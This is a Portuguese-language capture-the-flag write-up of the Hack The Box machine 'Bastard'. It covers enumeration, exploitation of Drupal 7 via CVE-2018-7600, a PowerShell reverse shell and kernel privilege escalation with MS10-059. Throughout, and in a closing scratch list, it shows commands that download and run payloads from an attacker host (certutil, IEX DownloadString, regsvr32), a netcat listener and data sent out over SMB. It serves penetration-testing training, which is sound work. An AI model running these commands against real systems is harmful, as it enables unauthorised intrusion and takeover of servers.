---
title:     "Hack The Box - Bastard"
tags: [windows,medium]
categories: HackTheBox
---

![1.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-bastard/1.jpg)

## Enumeration

Inicialmente, utilizamos o nmap para obter informacoes por exemplo: version, ports, status, vulns...

```
root@kali:~/HTB-Windows/bastard# nmap -Pn -p- -oN nmap/allports_tcp 10.10.10.9
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-23 21:06 EDT
Nmap scan report for 10.10.10.9
Host is up (0.20s latency).
Not shown: 65532 filtered ports
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
49154/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 430.79 seconds
```

Um novo scan apenas com as portas encontradas e assim obter versionamento.

```
oot@kali:~/HTB-Windows/bastard# nmap -sV -p80,135 -oN nmap/version 10.10.10.9
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-23 23:14 EDT
Nmap scan report for 10.10.10.9
Host is up (0.19s latency).

PORT    STATE SERVICE VERSION
80/tcp  open  http    Microsoft IIS httpd 7.5
135/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.51 seconds
```

Navegando ate o servido HTTP na porta 80, indentificco um DRUPAL

![2.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-bastard/2.jpg)

Huuuuuum... Veriricando o source do site eu vejo que trata-se de um **DRUPAL 7** e de acordo com minha experiencia existe exploits pra versao.

![3.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-bastard/3.jpg)

## Find exploits

Uma busca rapida encontramos varias formas de explorar

![4.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-bastard/4.jpg)


## Exploitation

Encontrei um exploit interessante e precisamos testar **CVE-2018-7600**

***reference*** https://github.com/pimps/CVE-2018-7600.git

Realmente eh vulneravel

`python drupa7-CVE-2018-7600.py -c whoami http://10.10.10.9/`

![5.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-bastard/5.jpg)

## Reverse Shell

Estou um tempinho tentando transferir arquivos para maquina e assim obter uma reverse shell

Acabei de fazer um teste e ver se o alvo se comunicava de volta comigo e sim, esta tudo ok.. preciso continuar tentando encontrar uma maneira de transferir arquivos..

AHhh, lembrando que eu ja dei uma verificada rapidas nos arquivos encontrados no diretorio do drupal.

![6.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-bastard/6.jpg)

Consegui usando o certutil

`python drupa7-CVE-2018-7600.py -c "certutil -urlcache -split -f http://10.10.14.36/shell.ps1 shell.ps1" http://10.10.10.9/`

`certutil -urlcache -split -f http://10.10.14.36/shell.ps1 shell.ps1`

![7.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-bastard/7.jpg)

Enfim pegamos nossa reverse shell

`python drupa7-CVE-2018-7600.py -c "powershell.exe -exec bypass .\shell.ps1" http://10.10.10.9/`

![8.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-bastard/8.jpg)

## Privilege Escalation

Vamos comecar a sessao de PE e assim ter acesso de user e system

![9.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-bastard/9.jpg)

Continuando a busca por vetores de escalada, comeco sempre por kernel exploitation, vamos user o **wesng** e o **windows-exploit-suggester**

Mas primeiro precisamos transferir o output do comando  **systeminfo** para nossa maquina.. usei o smbserver do impacket

`PS C:\inetpub\drupal-7.54> systeminfo >> \\10.10.14.36\tools\systeminfo.txt`

![10.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-bastard/10.jpg)

```
root@kali:~/HTB-Windows/bastard# ls
drupal  Invoke-PowerShellTcp.ps1  nmap  shell.ps1  wpe
root@kali:~/HTB-Windows/bastard# cd wpe/
root@kali:~/HTB-Windows/bastard/wpe# ls
systeminfo.txt
root@kali:~/HTB-Windows/bastard/wpe# python /opt/windowsPrivEsc/wesng/wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only >> exploits_sugest_wes.txt
usage: wes.py [-u] [--update-wes] [--version] [--definitions [DEFINITIONS]]
              [-p INSTALLEDPATCH [INSTALLEDPATCH ...]] [-d] [-e]
              [--hide HIDDENVULN [HIDDENVULN ...]] [-i IMPACTS [IMPACTS ...]]
              [-s SEVERITIES [SEVERITIES ...]] [-o [OUTPUTFILE]]
              [--muc-lookup] [-h]
              systeminfo [qfefile]
wes.py: error: argument --definitions: Definitions file 'definitions.zip' does not exist. Try running wes.py --update first.
root@kali:~/HTB-Windows/bastard/wpe# python /opt/windowsPrivEsc/wesng/wes.py --update
Windows Exploit Suggester 0.98 ( https://github.com/bitsadmin/wesng/ )
[+] Updating definitions
[+] Obtained definitions created at 20200616
root@kali:~/HTB-Windows/bastard/wpe# python /opt/windowsPrivEsc/wesng/wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only >> exploits_sugest_wes.txt
root@kali:~/HTB-Windows/bastard/wpe# 
```

Output do wes.py

```
Windows Exploit Suggester 0.98 ( https://github.com/bitsadmin/wesng/ )
[+] Parsing systeminfo output
[+] Operating System
    - Name: Windows Server 2008 R2 for x64-based Systems
    - Generation: 2008 R2
    - Build: 7600
    - Version: None
    - Architecture: x64-based
    - Installed hotfixes: None
[+] Loading definitions
    - Creation date of definitions: 20200616
[+] Determining missing patches
[+] Filtering duplicate vulnerabilities
[+] Applying display filters
[+] Found vulnerabilities

Date: 20120612
CVE: CVE-2012-0217
KB: KB2709715
Title: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: 
Severity: Important
Impact: Elevation of Privilege
Exploits: https://www.exploit-db.com/exploits/28718/, https://www.exploit-db.com/exploits/46508/

Date: 20130108
CVE: CVE-2013-0008
KB: KB2778930
Title: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: 
Severity: Important
Impact: Elevation of Privilege
Exploit: http://www.exploit-db.com/exploits/24485

Date: 20110208
CVE: CVE-2010-4398
KB: KB2393802
Title: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: 
Severity: Important
Impact: Elevation of Privilege
Exploits: http://www.exploit-db.com/bypassing-uac-with-user-privilege-under-windows-vista7-mirror/, http://www.exploit-db.com/exploits/15609/

[+] Missing patches: 3
    - KB2778930: patches 1 vulnerability
    - KB2393802: patches 1 vulnerability
    - KB2709715: patches 1 vulnerability
[+] KB with the most recent release date
    - ID: KB2778930
    - Release date: 20130108

[+] Done. Displaying 3 of the 207 vulnerabilities found.
```

Agora, usando o windows-exploit-suggester.py e com a opcao para apenas exploits LOCAL

```
root@kali:/opt/Windows-PrivEsc-Tools/Windows-Exploit-Suggester# python windows-exploit-suggester.py --database 2020-06-23-mssb.xls --systeminfo /root/HTB-Windows/bastard/wpe/systeminfo.txt -l
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (UTF-16)
[*] querying database file for potential vulnerabilities
[*] comparing the 0 hotfix(es) against the 197 potential bulletins(s) with a database of 137 known exploits
[*] there are now 197 remaining vulns
[*] searching for local exploits only
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2008 R2 64-bit'
[*] 
[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
[E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
[*] done
```

Mas uma breve pesquisa relacionada as  vulns encontradas, rapidamente encontro um exploit interessante e promissor.

***reference*** https://github.com/egre55/windows-kernel-exploits/tree/master/MS10-059:%20Chimichurri

Deixe a porta de sua escolha escutando, eu usei a 1337

`rlwrap nc -nlvp 1337`

Em seguida, execute o Chimichurri

`PS C:\inetpub\drupal-7.54> .\Chimichurri.exe 10.10.14.36 1337`

## GET SYSTEM

![11.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-bastard/11.jpg)

## Rascunho

```
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.36/shell.ps1')



regsvr32 /u /n /s /i:http://10.10.14.36/shell.ps1 C:\windows\temp\shell.ps1


powershell -exec bypass -f \\webdavserver\folder\payload.ps1



regsvr32 /u /n /s /i:http://10.10.14.36/shell.ps1 shell.ps1



certutil -urlcache -split -f http://10.10.14.36/shell.ps1 shell.ps1

python /opt/windowsPrivEsc/wesng/wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only >> exploits_sugest_wes.txt

python windows-exploit-suggester.py --database 2020-06-23-mssb.xls --systeminfo /root/HTB-Windows/bastard/systeminfo.txt
```
